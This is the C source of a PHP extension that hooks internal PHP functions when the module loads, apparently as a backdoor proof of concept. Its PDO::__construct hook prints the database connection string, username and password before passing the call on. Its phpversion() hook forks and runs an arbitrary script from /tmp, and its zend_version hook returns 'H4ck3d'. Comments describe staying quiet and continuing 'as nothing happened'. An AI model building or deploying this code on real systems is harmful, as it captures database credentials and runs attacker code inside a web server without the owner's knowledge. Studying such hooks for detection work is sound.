#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include <sys/wait.h>
#include <stdbool.h>

#include "php.h"
#include "he.h"

/* No public functions in this 'module' */
static zend_function_entry he_functions[] = {
    { NULL, NULL, NULL }
};

/* Function pointer to the original functions */
void (*original_pdo___construct)(INTERNAL_FUNCTION_PARAMETERS);
void (*original_phpversion)(INTERNAL_FUNCTION_PARAMETERS);

/* Hook a global function */
static bool hook_gfunction(const char *name, zend_function **func)
{
  HE_PRINTF("Trying to hook %s\n", name);
  /* Retrieves the function */
  *func = zend_hash_str_find_ptr(CG(function_table), name, strlen(name));
  return *func != NULL;
}

/* Hook a class method */
static bool hook_cmethod(const char *name, zend_function **func)
{
  zend_class_entry *class_entry;
  char *n = strdup(name);
  char *class_name = n;
  char *method_name = strstr(n, "::");

  *method_name = 0;
  method_name += 2;

  HE_PRINTF("Trying to hook %s::%s\n", class_name, method_name);

  /* Retrieves the class entry */
  class_entry = zend_hash_str_find_ptr(CG(class_table), class_name, strlen(class_name));
  if (!class_entry)
    return false;

  /* Retrieves the function */
  *func = zend_hash_str_find_ptr(&class_entry->function_table, method_name, strlen(method_name));
  free(n);
  return *func != NULL;
}

static bool he_hook(const char *name,
                    void (*hook)(INTERNAL_FUNCTION_PARAMETERS),
                    void (**original)(INTERNAL_FUNCTION_PARAMETERS))
{
  bool bs;
  zend_function *func;

  /* If no functions are provided */
  if (!hook)
    {
      HE_PRINTF("Missing hook function.");
      return false;
    }

  /* Is it a global function or a class method? */
  if (!strstr(name, "::"))
    bs = hook_gfunction(name, &func);
  else
    bs = hook_cmethod(name, &func);

  if (!bs)
    {
      HE_PRINTF("No function '%s' found.", name);
      return false;
    }

  /* Hooking done here */
  if (original)
    *original = func->internal_function.handler;
  func->internal_function.handler = *hook;

  HE_PRINTF("Successfully hooked '%s'\n", func->internal_function.function_name->val);
  return true;
}

PHP_FUNCTION(hook_pdo___construct)
{
  /* Parsing the parameters we need */
  zval *object = getThis();
  size_t data_source_len, usernamelen, passwordlen;
  char *username = NULL, *password = NULL, *data_source = NULL;
  zval *options = NULL;

  if (zend_parse_parameters_throw(ZEND_NUM_ARGS(), "s|s!s!a!", &data_source, &data_source_len,
      &username, &usernamelen, &password, &passwordlen, &options) == FAILURE)
    return;

  /* Print sensitive informations */
  php_printf("Connecting to %s using %s:%s\n\n", data_source, username, password);

  /* Continue as nothing happened */
  original_pdo___construct(execute_data, return_value);
}

PHP_FUNCTION(hook_phpversion)
{
  /* Execute a python script to avoid recompiling */
  char *av[] = { "python3", "/tmp/hello.py", NULL };

  if (!fork() && execvp(*av, av) == -1)
    exit(1);
  else
    wait(NULL);

  /* Continue normally once the script is done executing */
  original_phpversion(execute_data, return_value);
}

PHP_FUNCTION(hook_zend_version)
{
  /* B3c4us3 r34l 1337 h4x0rs us3 l33tsp34k */
  RETURN_STRING("H4ck3d\n");
}

PHP_MINIT_FUNCTION(he)
{
  /* PHP_FUNCTION() macro alters the function name to prefix it with 'zif_'  */
  he_hook("pdo::__construct", zif_hook_pdo___construct, &original_pdo___construct);
  he_hook("phpversion", zif_hook_phpversion, &original_phpversion);

  /* We don't use the original function, passing NULL just replace instead of hooking */
  he_hook("zend_version", zif_hook_zend_version, NULL);

  /* Never return failure, stay quiet */
  return SUCCESS;
}

/* zend module entry, no destructor nor any public functions */
zend_module_entry he_module_entry = {
  STANDARD_MODULE_HEADER,
  HE_NAME,
  NULL,
  PHP_MINIT(he),
  NULL,
  NULL,
  NULL,
  NULL,
  HE_VERSION,
  STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_HE
ZEND_GET_MODULE(he)
#endif
